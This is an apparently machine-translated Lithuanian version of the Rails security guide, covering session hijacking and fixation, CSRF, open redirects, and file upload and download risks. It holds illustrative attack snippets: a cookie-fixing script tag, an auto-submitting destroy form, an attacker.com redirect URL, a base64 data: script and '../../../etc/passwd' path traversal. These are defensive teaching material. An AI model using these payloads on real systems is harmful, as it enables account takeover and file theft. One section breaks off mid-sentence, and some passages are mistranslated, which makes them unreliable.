**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON https://guides.rubyonrails.org.**, original file md5: f769f3ad2ac56ac5949224832c8307e3
Rails aplikacijų saugumas
===========================

Šiame vadove aprašomi dažni saugumo problemos interneto aplikacijose ir kaip joms išvengti naudojant Rails.

Po šio vadovo perskaitymo, žinosite:

* Visus priešpriemones, _kurios yra paryškintos_.
* Sesionų sąvoką Rails, ką ten reikia įdėti ir populiarius atakos metodus.
* Kaip tiesiog apsilankymas svetainėje gali būti saugumo problema (su CSRF).
* Ką reikia atkreipti dėmesį dirbant su failais ar teikiant administravimo sąsają.
* Kaip tvarkyti vartotojus: prisijungimą ir atsijungimą ir atakos metodus visuose sluoksniuose.
* Ir populiariausius įterpimo atakos metodus.

--------------------------------------------------------------------------------

Įvadas
-------

Internetinių aplikacijų karkasai skirti padėti programuotojams kurti internetines aplikacijas. Kai kurie iš jų taip pat padeda apsaugoti internetinę aplikaciją. Iš tikrųjų vienas karkasas nėra saugesnis nei kitas: jei jį naudojate teisingai, galėsite kurti saugias programas su daugeliu karkasų. Ruby on Rails turi keletą išmaniuosius pagalbos metodus, pavyzdžiui, prieš SQL įterpimą, todėl tai beveik nėra problema.

Bendrai sakant, nėra tokio dalyko kaip "įjunk ir naudok" saugumas. Saugumas priklauso nuo žmonių, naudojančių karkasą, ir kartais nuo plėtros metodo. Ir tai priklauso nuo visų internetinės aplikacijos aplinkos sluoksnių: pagrindinio saugojimo, interneto serverio ir pačios internetinės aplikacijos (ir galbūt kitų sluoksnių ar aplikacijų).

Tačiau Gartner Group įvertina, kad 75% atakų yra interneto aplikacijų lygyje ir nustato, kad "iš 300 patikrintų svetainių 97% yra pažeidžiamos atakai". Tai yra todėl, kad internetinės aplikacijos yra santykinai lengvai atakuojamos, nes jas suprasti ir manipuliuoti yra paprasta, netgi paprastam žmogui.

Grėsmės internetinėms aplikacijoms apima vartotojo paskyros pavogimą, prieigos kontrolės apieiką, jautrios informacijos skaitymą ar modifikavimą arba suklastotų turinių pateikimą. Arba puolėjas gali įdiegti trojos arklio programą ar nepageidaujamą el. pašto siuntimo programinę įrangą, siekti finansinio praturtinimo ar pakenkti prekės ženklo vardui modifikuojant įmonės išteklius. Norint užkirsti kelią atakoms, sumažinti jų poveikį ir pašalinti atakos taškus, visų pirma reikia visiškai suprasti atakos metodus, kad būtų galima rasti tinkamas priešpriemones. Tai ir siekia šis vadovas.

Norint kurti saugias internetines aplikacijas, turite būti visų sluoksnių naujienose ir pažinti savo priešus. Norėdami būti naujienose, užsiprenumeruokite saugumo pašto sąrašus, skaitykite saugumo tinklaraščius ir įpraskite atnaujinimus ir saugumo patikras (patikrinkite [Papildomos informacijos](#papildomos-informacijos) skyrių). Tai daroma rankiniu būdu, nes taip galima rasti nemalonius loginius saugumo problemas.

Sesijos
--------

Šiame skyriuje aprašomos tam tikros sesijų susijusios atakos ir saugumo priemonės, skirtos apsaugoti jūsų sesijos duomenis.

### Kas yra sesijos?

INFO: Sesijos leidžia aplikacijai išlaikyti vartotojo specifinę būseną, kol vartotojai sąveikauja su aplikacija. Pavyzdžiui, sesijos leidžia vartotojams autentifikuotis vieną kartą ir likti prisijungusiems ateities užklausoms.

Daugeliui aplikacijų reikia sekti būseną vartotojams, kurie sąveikauja su aplikacija. Tai gali būti pirkinių krepšelio turinys arba dabar prisijungusio vartotojo id. Tokia vartotojo specifinė būsena gali būti saugoma sesijoje.

Rails kiekvienam vartotojui, kuris prisijungia prie aplikacijos, teikia sesijos objektą. Jei vartotojas jau turi aktyvią sesiją, Rails naudoja esamą sesiją. Kitu atveju sukuriamas naujas sesijos objektas.

PASTABA: Daugiau informacijos apie sesijas ir kaip jas naudoti galima rasti [Veiksmų valdiklio apžvalgos vadove](action_controller_overview.html#session).

### Sesijos pavogimas

ĮSPĖJIMAS: _Vartotojo sesijos ID pavogimas leidžia puolėjui naudotis interneto aplikacija vartotojo vardu._

Daugelio internetinių aplikacijų yra autentifikavimo sistema: vartotojas pateikia prisijungimo vardą ir slaptažodį, internetinė aplikacija juos patikrina ir saugo atitinkamo vartotojo id sesijos maiše. Nuo šiol sesija yra galiojanti. Kiekvienoje užklausoje aplikacija įkelia vartotoją, kurį identifikuoja sesijoje esantis vartotojo id, be naujo autentifikavimo poreikio. Slapukas su sesijos ID identifikuoja sesiją.

Taigi, slapukas tarnauja kaip laikinas autentifikavimas interneto aplikacijai. Bet kas, kas pavogia slapuką iš kitos asmenybės, gali naudotis interneto aplikacija kaip šis vartotojas - su galimai rimtomis pasekmėmis. Čia pateikiami keli būdai pavogti sesiją ir jų priešpriemonės:
* Užfiksuokite slapuką nesaugioje tinklo aplinkoje. Belaidis LAN gali būti toks tinklas. Nesušifruotas belaidis LAN yra ypač lengva klausytis visų prisijungusių klientų srauto. Tinklalapio kūrėjui tai reiškia, kad reikia _pateikti saugią SSL ryšį_. "Rails" 3.1 ir vėlesnėse versijose tai galima pasiekti visada priverčiant SSL ryšį savo aplikacijos konfigūracijos faile:

    ```ruby
    config.force_ssl = true
    ```

* Dauguma žmonių nesunaikina slapukų po darbo viešoje terminalo. Taigi, jei paskutinis naudotojas neišsiregistravo iš tinklalapio, galėsite jį naudoti kaip šį naudotoją. Tinklalapyje naudotojui suteikite _atsijungimo mygtuką_, ir _padarykite jį iškiliai matomą_.

* Daugelis kryžminio svetainių skriptavimo (XSS) išnaudojimų siekia gauti naudotojo slapuką. Apie tai, kaip tai daroma, skaitysite [daugiau apie XSS](#cross-site-scripting-xss) vėliau.

* Vietoje slapuko, nežinomo atakintojui, vagystės, jie taiso naudotojo sesijos identifikatorių (slapuke), žinomą jiems. Apie tai, vadinamąją sesijos fiksaciją, skaitysite vėliau.

Daugumos atakų tikslas yra užsidirbti pinigų. Pagal [Symantec Internet Security Threat Report (2017)](https://docs.broadcom.com/docs/istr-22-2017-en), pavogtų banko prisijungimo paskyrų kainos juodojoje rinkoje svyruoja nuo 0,5% iki 10% sąskaitos likučio, nuo 0,5 iki 30 JAV dolerių už kredito kortelės numerį (20-60 JAV dolerių su visais duomenimis), nuo 0,1 iki 1,5 JAV dolerių už tapatybę (vardas, SSN ir DOB), nuo 20 iki 50 JAV dolerių už pardavėjo paskyras ir nuo 6 iki 10 JAV dolerių už debesų paslaugų teikėjo paskyras.

### Sesijos saugojimas

PASTABA: "Rails" pagal nutylėjimą naudoja `ActionDispatch::Session::CookieStore` kaip sesijos saugojimo būdą.

PATARIMAS: Sužinokite daugiau apie kitus sesijos saugojimo būdus [Action Controller Overview Guide](action_controller_overview.html#session).

"Rails" `CookieStore` įrašo sesijos maišą į slapuką kliento pusėje.
Serveris gauna sesijos maišą iš slapuko ir
pašalina poreikį turėti sesijos ID. Tai labai padidina
programos greitį, tačiau tai yra ginčytinas saugojimo būdas ir
reikia apsvarstyti saugumo implikacijas ir saugojimo
apribojimus:

* Slapukai turi dydžio apribojimą - 4 kB. Slapukuose naudokite tik sesijai svarbius duomenis.

* Slapukai saugomi kliento pusėje. Klientas gali išlaikyti slapuko turinį net ir po jo galiojimo pabaigos. Klientas gali kopijuoti slapukus į kitus kompiuterius. Venkite slapukuose saugoti jautrią informaciją.

* Slapukai yra laikini pagal savo prigimtį. Serveris gali nustatyti slapuko galiojimo laiką, tačiau klientas gali ištrinti slapuką ir jo turinį prieš tai. Visus ilgalaikės prigimties duomenis saugokite serverio pusėje.

* Sesijos slapukai nepasibaigia ir gali būti piktnaudžiaujama. Gali būti gera mintis, kad jūsų aplikacija panaikintų senus sesijos slapukus naudojant saugomą laiko žymą.

* "Rails" pagal nutylėjimą šifruoja slapukus. Klientas negali skaityti ar redaguoti slapuko turinio, nes tai pažeistų šifravimą. Jei tinkamai saugosite savo paslaptis, slapukus galite laikyti apskritai saugiais.

"CookieStore" naudoja
[užšifruotą](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted)
slapukų dėžutę, kad suteiktų saugią, užšifruotą vietą sesijos
duomenims saugoti. Slapukais pagrįstos sesijos suteikia tiek vientisumą, tiek
paslaptingumą jų turiniui. Šifravimo raktas ir
patvirtinimo raktas, naudojami
[parašytiems](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed)
slapukams, gaunami iš `secret_key_base` konfigūracijos reikšmės.

PATARIMAS: Slaptieji žodžiai turi būti ilgi ir atsitiktiniai. Naudokite `bin/rails secret`, kad gautumėte naujus unikalius slaptus žodžius.

INFORMACIJA: Sužinokite daugiau apie [slaptųjų žodžių valdymą vėliau šiame vadove](security.html#custom-credentials)

Taip pat svarbu naudoti skirtingus druskos reikšmes užšifruotiems ir
parašytiems slapukams. Jei naudojate tą pačią reikšmę skirtingoms druskos konfigūracijoms,
gali būti naudojamas tas pats gautas raktas skirtingoms
saugumo funkcijoms, kas gali silpninti rakto stiprumą.

Testavimo ir plėtojimo programose gaunamas `secret_key_base`, gautas iš programos pavadinimo. Kiti aplinkos turi naudoti atsitiktinį raktą, esantį `config/credentials.yml.enc` faile, čia parodytas iššifruotas pavyzdys:

```yaml
secret_key_base: 492f...
```

ĮSPĖJIMAS: Jei jūsų aplikacijos paslapčių gali būti atskleista, labai svarbu jas pakeisti. Atkreipkite dėmesį, kad pakeitus `secret_key_base`, dabartinės aktyvios sesijos pasibaigs ir visi naudotojai turės iš naujo prisijungti. Be to, gali būti paveikti ir kiti duomenys: užšifruoti slapukai, parašyti slapukai ir "Active Storage" failai.

### Užšifruotų ir parašytų slapukų konfigūracijos keitimas

Pasukimas yra idealus būdas keisti slapukų konfigūraciją ir užtikrinti, kad seni slapukai
nebūtų nedelsiant negaliojantys. Tada jūsų naudotojai turi galimybę apsilankyti jūsų svetainėje,
perskaityti slapuką su sena konfigūracija ir jį perrašyti su
nauju pakeitimu. Pasukimą galima pašalinti, kai jau pakankamai patogu
naudotojams buvo suteikta galimybė atnaujinti savo slapukus.
Galima pasukti šifrus ir maišytuvus, naudojamus užšifruotiems ir pasirašytiems slapukams.

Pavyzdžiui, norint pakeisti pasirašytų slapukų maišytuvą nuo SHA1 iki SHA256, pirma reikia priskirti naują konfigūracijos reikšmę:

```ruby
Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
```

Dabar pridėkite rotaciją senam SHA1 maišytuvui, kad esami slapukai būtų sklandžiai atnaujinami nauju SHA256 maišytuvu.

```ruby
Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
  cookies.rotate :signed, digest: "SHA1"
end
```

Tada visi rašomi pasirašyti slapukai bus maišomi naudojant SHA256. Seni slapukai, kurie buvo rašyti naudojant SHA1, vis tiek gali būti nuskaityti, ir jei prieinami, bus rašomi nauju maišytuvu, kad jie būtų atnaujinti ir nebus negaliojantys, kai pašalinsite rotaciją.

Kai vartotojai su SHA1 maišytuvu pasirašyti slapukai nebeturėtų turėti galimybės būti perrašytiems, pašalinkite rotaciją.

Nors galite nustatyti tiek daug rotacijų, kiek norite, paprastai nėra įprasta turėti daug rotacijų vienu metu.

Norėdami gauti daugiau informacijos apie raktų rotaciją su užšifruotais ir pasirašytais pranešimais, taip pat apie įvairias galimybes, kurias priima `rotate` metodas, kreipkitės į
[MessageEncryptor API](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html)
ir
[MessageVerifier API](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html)
dokumentaciją.

### Pakartotiniai atakos "CookieStore" seansams

PATARIMAS: _Kita ataka, kurią turite žinoti, naudojant `CookieStore`, yra pakartotinė ataka._

Tai veikia taip:

* Vartotojui suteikiamos kreditai, suma saugoma seanse (kas vis tiek yra bloga idėja, bet mes tai padarysime demonstraciniams tikslams).
* Vartotojas kažką perka.
* Naujai pritaikyta kredito vertė saugoma seanse.
* Vartotojas paima slapuką iš pirmo žingsnio (kurį jie anksčiau nukopijavo) ir pakeičia dabartinį slapuką naršyklėje.
* Vartotojui grąžinami jo pradiniai kreditai.

Pakartotinės atakos išvengiama įtraukiant vienkartinį naudoti atsitiktinę reikšmę į seansą. Vienvartinė reikšmė yra galiojanti tik vieną kartą, ir serveris turi sekti visus galiojančius vienkartinio naudojimo kodus. Tai tampa dar sudėtingiau, jei turite kelis taikomųjų serverius. Vienvartinės reikšmės saugojimas duomenų bazės lentelėje panaikintų visą "CookieStore" tikslą (vengti duomenų bazės prieigos).

Geriausias _sprendimas prieš tai yra nešifruoti šio tipo duomenų seanse, o duomenų bazėje_. Šiuo atveju kreditas saugomas duomenų bazėje, o `logged_in_user_id` - seanse.

### Seanso fiksacija

PASTABA: _Nepriklausomai nuo to, kad gali būti pavogtas vartotojo seanso ID, puolėjas gali fiksuoti jam žinomą seanso ID. Tai vadinama seanso fiksacija._

![Seanso fiksacija](images/security/session_fixation.png)

Ši ataka susitelkia į fiksuotą vartotojo seanso ID, žinomą puolėjui, ir priverčia vartotojo naršyklę naudoti šį ID. Todėl puolėjui vėliau nereikia vogti seanso ID. Čia pateikiamas šios atakos veikimo principas:

* Puolėjas sukuria galiojantį seanso ID: Jis įkelia prisijungimo puslapį į norimą internetinę programą ir paima seanso ID iš slapuko, gauto iš atsakymo (žr. numerius 1 ir 2 paveikslėlyje).
* Jis periodiškai palaiko seansą, pasiekdamas internetinę programą, kad išlaikytų baigiamąjį seansą.
* Puolėjas priverčia vartotojo naršyklę naudoti šį seanso ID (žr. numerį 3 paveikslėlyje). Kadangi negalite keisti kito domeno slapuko (dėl tos pačios kilmės politikos), puolėjui reikia paleisti "JavaScript" iš taikomosios internetinės programos domeno. Tai pasiekia šią ataką įterpiant "JavaScript" kodą į programą naudojant XSS. Čia pateikiamas pavyzdys: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. Daugiau informacijos apie XSS ir įterpimą skaitykite vėliau.
* Puolėjas vilioja auką į užkrėstą puslapį su "JavaScript" kodu. Peržiūrėjus puslapį, aukos naršyklė pakeis seanso ID į spąstų seanso ID.
* Kadangi naujas spąstų seansas nenaudojamas, internetinė programa reikalauja, kad vartotojas autentikuotųsi.
* Nuo šiol auka ir puolėjas bendrai naudos internetinę programą su tuo pačiu seansu: seansas tapo galiojančiu, o auka nepastebėjo atakos.

### Seanso fiksacija - Gynimo priemonės

PATARIMAS: _Vienas kodas apsaugos jus nuo seanso fiksacijos._

Efektyviausia gynimo priemonė yra _išduoti naują seanso identifikatorių_ ir po sėkmingo prisijungimo paskelbti senąjį negaliojančiu. Taip puolėjas negalės naudoti fiksuoto seanso identifikatoriaus. Tai taip pat yra gera gynimo priemonė prieš seanso pagrobimą. Čia pateikiama, kaip sukurti naują seansą "Rails":
```ruby
reset_session
```

Jei naudojate populiarų [Devise](https://rubygems.org/gems/devise) gemą naudotojų valdymui, jis automatiškai baigsis sesijas prisijungimo ir atsijungimo metu. Jei kuriate savo sprendimą, nepamirškite baigti sesiją po prisijungimo veiksmo (kai sesija yra sukurta). Tai pašalins reikšmes iš sesijos, todėl _jums reikės perkelti jas į naują sesiją_.

Kitas apsaugos priemonė yra _išsaugoti naudotojui specifines savybes sesijoje_, patikrinti jas kiekvieną kartą, kai gaunamas užklausimas, ir atsisakyti prieigos, jei informacija neatitinka. Tokios savybės gali būti nuotolinio IP adreso arba naudotojo agento (naršyklės pavadinimo), nors pastarasis yra mažiau naudotojui specifinis. Išsaugodami IP adresą, turite atsiminti, kad yra interneto paslaugų teikėjų ar didelių organizacijų, kurios slepia savo naudotojus už tarpinių serverių. _Šie gali keistis sesijos metu_, todėl šie naudotojai negalės naudotis jūsų programa arba gal
### CSRF apsaugos priemonės

PASTABA: _Pirma, kaip reikalauja W3C, tinkamai naudokite GET ir POST. Antra, saugumo ženklas ne-GET užklausose apsaugos jūsų programą nuo CSRF._

#### Tinkamai naudokite GET ir POST

HTTP protokolas pagrindiniu būdu siūlo dvi pagrindines užklausų rūšis - GET ir POST (DELETE, PUT ir PATCH turėtų būti naudojami kaip POST). Pasaulinio plačiajuostio tinklo konsorciumas (W3C) pateikia sąrašą, kaip pasirinkti HTTP GET ar POST:

**Naudokite GET, jei:**

* Sąveika yra labiau _kaip klausimas_ (t. y. tai yra saugi operacija, tokia kaip užklausa, skaitymo operacija ar paieška).

**Naudokite POST, jei:**

* Sąveika yra labiau _kaip užsakymas_, arba
* Sąveika _keičia resurso būseną_ taip, kad vartotojas tai pastebėtų (pvz., paslaugos prenumerata), arba
* Vartotojas yra _atsakingas už sąveikos rezultatus_.

Jei jūsų internetinė programa yra RESTful, jūs turbūt naudojate papildomus HTTP veiksmus, tokius kaip PATCH, PUT ar DELETE. Tačiau kai kurios senosios naršyklės jų nepalaiko - tik GET ir POST. „Rails“ naudoja paslėptą `_method` lauką, kad būtų galima tvarkyti šiuos atvejus.

_POST užklausas taip pat galima siųsti automatiškai_. Šiame pavyzdyje nuoroda www.harmless.com rodoma naršyklės būsenos juostoje kaip paskirtis. Bet iš tikrųjų ji dinamiškai sukuria naują formą, kuri siunčia POST užklausą.

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">Į nekenksmingą apklausą</a>
```

Arba puolėjas įdeda kodą į paveikslėlio onmouseover įvykio apdorojimo programą:

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

Yra daugybė kitų galimybių, pvz., naudojant `<script>` žymą, kad būtų galima atlikti tarpsvetaininę užklausą į URL su JSONP arba JavaScript atsaku. Atsakas yra vykdomasis kodas, kurį puolėjas gali paleisti, galbūt ištraukdamas jautrią informaciją. Norint apsaugoti nuo šios duomenų nutekėjimo, turime neleisti tarpsvetaininių `<script>` žymių. Tačiau „Ajax“ užklausos laikosi naršyklės tąsos politikos (tik jūsų pačių svetainė gali inicijuoti `XmlHttpRequest`), todėl galime saugiai leisti jiems grąžinti JavaScript atsakus.

PASTABA: Mes negalime atskirti `<script>` žymos kilmės - ar tai yra žyma jūsų pačios svetainėje, ar kito kenksmingoje svetainėje - todėl mes turime blokuoti visas `<script>` žymas, net jei tai iš tikrųjų yra saugi tąsos kilmės žyma, kurią teikia jūsų pačios svetainė. Tokiu atveju išimtinai praleiskite CSRF apsaugą veiksmams, kurie teikia JavaScript skirtą `<script>` žymai.

#### Reikalingas saugumo ženklas

Norint apsisaugoti nuo visų kitų suklastotų užklausų, įvedame _reikalingą saugumo ženklą_, kurį mūsų svetainė žino, bet kitos svetainės nežino. Mes įtraukiame saugumo ženklą į užklausas ir jį patikriname serveryje. Tai atliekama automatiškai, kai [`config.action_controller.default_protect_from_forgery`][] nustatytas kaip `true`, kas yra numatytoji naujai sukurtoms „Rails“ programoms. Taip pat galite tai padaryti rankiniu būdu pridėdami šį kodą į savo programos valdiklį:

```ruby
protect_from_forgery with: :exception
```

Tai įtrauks saugumo ženklą į visas „Rails“ sugeneruotas formas. Jei saugumo ženklas neatitiks tikėtų rezultatų, bus iškelta išimtis.

Pateikiant formas naudojant [Turbo](https://turbo.hotwired.dev/), taip pat reikalingas saugumo ženklas. „Turbo“ ieško ženklo `csrf` jūsų programos išdėstymo meta žymose ir jį prideda į užklausą `X-CSRF-Token` užklausos antraštėje. Šias meta žymes galima sukurti naudojant [`csrf_meta_tags`][] pagalbinę funkciją:

```erb
<head>
  <%= csrf_meta_tags %>
</head>
```

kas rezultatu duos:

```html
<head>
  <meta name="csrf-param" content="authenticity_token" />
  <meta name="csrf-token" content="THE-TOKEN" />
</head>
```

Kai iš JavaScript pateikiate savo pačių ne-GET užklausas, taip pat reikalingas saugumo ženklas. [„Rails Request.JS“](https://github.com/rails/request.js) yra JavaScript biblioteka, kuri apgaubia privalomų užklausos antraščių pridėjimo logiką.

Jei naudojate kitą biblioteką, kad atliktumėte „Ajax“ užklausas, būtina patys pridėti saugumo ženklą kaip numatytąją antraštę. Norėdami gauti ženklą iš meta žymos, galite padaryti kažką panašaus į tai:

```javascript
document.head.querySelector("meta[name=csrf-token]")?.content
```

#### Išvalyti nuolatinius slapukus

Įprasta naudoti nuolatinius slapukus saugoti vartotojo informacijai, pavyzdžiui, naudojant `cookies.permanent`. Tokiu atveju slapukai nebus išvalyti ir numatytoji CSRF apsauga nebus veiksminga. Jei naudojate kitą slapukų saugyklą nei sesija šiai informacijai, turite patys apsvarstyti, kaip su ja elgtis:
```ruby
rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # Pavyzdinis metodas, kuris sunaikins vartotojo slapukus
end
```

Aukščiau pateiktą metodą galima įdėti į `ApplicationController` ir jis bus iškviestas, kai CSRF žetonas nebus pateiktas arba bus neteisingas ne-GET užklausoje.

Atkreipkite dėmesį, kad _visi CSRF apsaugos pažeidimai yra praleidžiami peržiūrint svetainės peržiūros (XSS) pažeidimus_. XSS leidžia puolėjui gauti prieigą prie visų elementų puslapyje, todėl jie gali perskaityti CSRF saugumo žetoną iš formos arba tiesiogiai pateikti formą. Daugiau informacijos apie XSS galite rasti [čia](#cross-site-scripting-xss).

Nukreipimas ir failai
---------------------

Kitas saugumo pažeidimų tipas susijęs su nukreipimu ir failų naudojimu interneto aplikacijose.

### Nukreipimas

ĮSPĖJIMAS: _Nukreipimas interneto aplikacijoje yra nepakankamai įvertintas įsilaužėlių įrankis: Puolėjas ne tik gali nukreipti vartotoją į sukčiavimo svetainę, bet ir sukurti savarankišką ataką._

Kai vartotojui leidžiama perduoti (dalį) URL nukreipimui, tai gali būti pažeidžiama. Akivaizdžiausia ataka būtų nukreipti vartotojus į sukčiavimo svetainę, kuri atrodo ir veikia taip pat kaip ir originali. Tokia vadinama phishing ataka veikia siunčiant įtartiną nuorodą el. paštu vartotojams, įterpiant nuorodą per XSS interneto aplikacijoje arba įdedant nuorodą į išorinę svetainę. Ji yra neįtartinė, nes nuoroda prasideda nuoroda į interneto aplikaciją, o nuoroda į kenksmingą svetainę yra paslėpta nukreipimo parametre: http://www.example.com/site/redirect?to=www.attacker.com. Čia pateikiamas pavyzdys senosios veiksmo funkcijos:

```ruby
def legacy
  redirect_to(params.update(action: 'main'))
end
```

Tai nukreips vartotoją į pagrindinį veiksmą, jei jie bandė pasiekti senąjį veiksmą. Tikslas buvo išsaugoti URL parametrus senajam veiksmui ir perduoti juos pagrindiniam veiksmui. Tačiau tai gali būti išnaudojama puolėjo, jei jie įtraukė šeimininko raktą į URL:

```
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
```

Jei jis yra URL pabaigoje, jis beveik nepastebimas ir nukreipia vartotoją į `attacker.com` šeimininką. Kaip bendra taisyklė, vartotojo įvestis tiesiogiai perduodama į `redirect_to` laikoma pavojinga. Paprastas apsaugos priemonė būtų _įtraukti tik tikėtinas parametrus į senąjį veiksmą_ (vėl leidžiant sąrašo požiūrį, priešingai nei pašalinant netikėtus parametrus). _Ir jei nukreipiama į URL, patikrinkite jį su leidžiamu sąrašu ar reguliariąja išraiška_.

#### Savarankiškas XSS

Kitas nukreipimo ir savarankiško XSS atakos būdas veikia „Firefox“ ir „Opera“ naršyklėse naudojant duomenų protokolą. Šis protokolas tiesiogiai rodo jo turinį naršyklėje ir gali būti bet kas, nuo HTML ar JavaScript iki visų paveikslėlių:

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`

Šis pavyzdys yra Base64 koduotas JavaScript, kuris rodo paprastą pranešimo langą. Nukreipimo URL atveju puolėjas galėtų nukreipti į šį URL su kenksmingu kodu. Kaip apsaugos priemonė, _neleiskite vartotojui pateikti (dalies) URL, į kurį bus nukreipta_.

### Failų įkėlimas

PASTABA: _Įsitikinkite, kad failų įkėlimas neperkrauna svarbių failų ir apdoroja medijos failus asinchroniškai._

Daugelis interneto aplikacijų leidžia vartotojams įkelti failus. _Failų pavadinimai, kuriuos vartotojas gali pasirinkti (iš dalies), visada turėtų būti filtruojami_, nes puolėjas galėtų naudoti kenksmingą failo pavadinimą, kad perrašytų bet kurį failą serveryje. Jei saugojate failų įkėlimus /var/www/uploads, o vartotojas įveda failo pavadinimą kaip "../../../etc/passwd", jis gali perrašyti svarbų failą. Žinoma, „Ruby“ interpretatorius turėtų turėti tinkamus leidimus tai padaryti - dar viena priežastis paleisti interneto serverius, duomenų bazės serverius ir kitas programas kaip mažiau privilegijuotas „Unix“ vartotojas.

Filtruojant vartotojo įvesties failų pavadinimus, _nepasistenkite pašalinti kenksmingų dalių_. Pagalvokite apie situaciją, kai interneto aplikacija pašalina visus "../" failo pavadinime, o puolėjas naudoja tokį simbolių eilutę kaip "....//" - rezultatas bus "../". Geriausia naudoti leidžiamų simbolių rinkinio požiūrį, kuris _patikrina failo pavadinimo tinkamumą su priimamų simbolių rinkiniu_. Tai prieštarauja ribotam simbolių rinkinio požiūriui, kuris bando pašalinti neleistinus simbolius. Jei tai nėra tinkamas failo pavadinimas, atminkite jį (arba pakeiskite neleistinus simbolius), bet jų nešalinkite. Čia pateikiamas failo pavadinimo valytojas iš [attachment_fu įskiepio](https://github.com/technoweenie/attachment_fu/tree/master):

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # PASTABA: File.basename neteisingai veikia su „Windows“ keliais „Unix“
    # gauti tik failo pavadinimą, o ne visą kelią
    name.sub!(/\A.*(\\|\/)/, '')
    # Galiausiai pakeiskite visus ne alfanumerinius, pabraukimo ženklus
    # arba taškus pabraukimu
    name.gsub!(/[^\w.-]/, '_')
  end
end
```
Sinhroninio failų įkėlimo (pvz., naudojant `attachment_fu` įskiepį paveikslėliams) svarbus trūkumas yra jo pažeidžiamumas prieš atakas, siekiančias užkirsti kelią paslaugos teikimui. Puolėjas gali sinchroniškai pradėti daugybę paveikslėlių failų įkėlimo iš daugelio kompiuterių, padidinant serverio apkrovą ir galiausiai gali sukelti serverio sutrikimą ar sustojimą.

Šio problemai spręsti geriausia yra _asinchroninio medijos failų apdorojimo procesas_: Išsaugokite medijos failą ir suplanuokite apdorojimo užklausą duomenų bazėje. Antras procesas apdoros failo apdorojimą fone.

### Vykdomasis kodas failų įkėlimuose

ĮSPĖJIMAS: _Įkeltuose failuose esantis šaltinis gali būti vykdomas, jei jis yra tam tikrose direktorijose. Jei tai yra Apache namų direktorija, neįkelkite failų įkėlimų į „Rails“ /public direktoriją._

Populiarus „Apache“ interneto serveris turi parinktį, vadinamą „DocumentRoot“. Tai yra svetainės namų direktorija, viskas šioje direktorijos medžio šakoje bus aptarnaujama interneto serverio. Jei yra failų su tam tikru failo plėtiniu, jame esantis kodas bus vykdomas, kai jis bus užklaustas (gali reikėti nustatyti kai kurias parinktis). Pavyzdžiui, tai gali būti PHP ir CGI failai. Pagalvokite apie situaciją, kai puolėjas įkelia failą "file.cgi", kuriame yra kodas, kuris bus vykdomas, kai kas nors atsisiunčia failą.

_Jei jūsų Apache DocumentRoot rodo į „Rails“ /public direktoriją, nekelkite failų įkėlimų į ją_, saugokite failus bent vienu lygiu aukščiau.

### Failų atsisiuntimas

PASTABA: _Įsitikinkite, kad vartotojai negali atsisiųsti valią failų._

Kaip ir įkeliant failus, taip ir atsisiunčiant reikia filtruoti failų pavadinimus. Metodas `send_file()` siunčia failus iš serverio į klientą. Jei naudojate vartotojo įvestą failo pavadinimą be filtravimo, galima atsisiųsti bet kurį failą:

```ruby
send_file('/var/www/uploads/' + params[:filename])
```

Paprastai perduodamas failo pavadinimas, pvz., "../../../etc/passwd", leidžia atsisiųsti serverio prisijungimo informaciją. Paprastas sprendimas šiai problemai yra _patikrinti, ar prašomas failas yra tikėtinoje direktorijoje_:

```ruby
basename = File.expand_path('../../files', __dir__)
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename != File.expand_path(File.dirname(filename))
send_file filename, disposition: 'inline'
```

Kitas (papildomas) požiūris yra saugoti failų pavadinimus duomenų bazėje ir pavadinti failus diske pagal duomenų bazėje esančius identifikatorius. Tai taip pat geras būdas išvengti galimo įkelto failo kode esančio kodo vykdymo. „attachment_fu“ įskiepis tai daro panašiu būdu.

Vartotojų valdymas
------------------

PASTABA: _Beveik kiekviena interneto aplikacija turi spręsti autorizacijos ir autentifikacijos problemas. Vietoje to, kad kurtumėte savo sprendimą, rekomenduojama naudoti paplitusius įskiepius. Tačiau taip pat svarbu juos nuolat atnaujinti. Keletas papildomų atsargumo priemonių gali padidinti jūsų aplikacijos saugumą._

„Rails“ yra daugybė autentifikacijos įskiepių. Geros tokių įskiepių, kaip populiari [devise](https://github.com/heartcombo/devise) ir [authlogic](https://github.com/binarylogic/authlogic), yra tai, kad jie saugo tik kriptografiškai užšifruotus slaptažodžius, o ne grynaisiais tekstais. Nuo „Rails“ 3.1 versijos taip pat galite naudoti įdiegtą [`has_secure_password`](https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password) metodą, kuris palaiko saugų slaptažodžių užšifravimą, patvirtinimą ir atkūrimo mechanizmus.

### Priverstinis paskyrų išbandymas

PASTABA: _Priverstiniai paskyrų išbandymai yra bandymai išbandyti prisijungimo prieigos duomenis. Atremkite juos naudodami bendresnius klaidų pranešimus ir galbūt reikalaukite įvesti CAPTCHA._

Jūsų interneto aplikacijos vartotojų sąrašas gali būti piktnaudžiaujamas, siekiant priverstinai išbandyti atitinkamus slaptažodžius, nes dauguma žmonių nenaudoja sudėtingų slaptažodžių. Dauguma slaptažodžių yra žodyno žodžių ir galimai skaičių derinys. Taigi, turint vartotojų sąrašą ir žodyną, automatinė programa gali rasti teisingą slaptažodį per kelias minutes.

